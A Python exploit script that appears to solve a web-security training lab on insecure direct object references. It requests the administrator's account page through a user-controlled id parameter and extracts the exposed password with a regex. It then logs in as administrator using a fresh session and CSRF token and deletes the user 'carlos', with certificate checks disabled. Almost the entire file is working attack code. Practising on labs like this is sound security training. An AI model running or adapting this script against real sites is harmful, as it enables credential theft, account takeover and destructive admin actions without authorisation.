import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "User ID controlled by request parameter with password disclosure"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch administrator page via URL id parameter\n2. Extract the password from source code\n3. Fetch the login page to get a valid session and the csrf token\n4. Login as administrator\n5. Delete carlos\n""")

    print(Fore.WHITE + "[1] Fetching administrator profile page")
    admin_profile = requests.get(
        f"{url}/my-account?id=administrator", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting password from source code")
    admin_password = re.findall(
        "name=password value='(.*)'", admin_profile.text)[0]
    print(Fore.GREEN + "Admin password" + Fore.WHITE +
          " => " + Fore.YELLOW + admin_password)

    print(Fore.WHITE +
          "[3] Fetching the login page to get a valid session and the csrf token")

    login_page = requests.get(
        f"{url}/login", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[4] Logging in as administrator")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    session = login_page.cookies.get("session")
    cookies = {"session": session}
    data = {"username": "administrator",
            "password": admin_password, "csrf": csrf_token}

    login_as_admin = requests.post(
        f"{url}/login", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[5] Deleting carlos")
    admin_session = login_as_admin.cookies.get("session")
    cookies = {"session": admin_session}
    try:
        r = requests.get(
            f"{url}/admin/delete?username=carlos", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
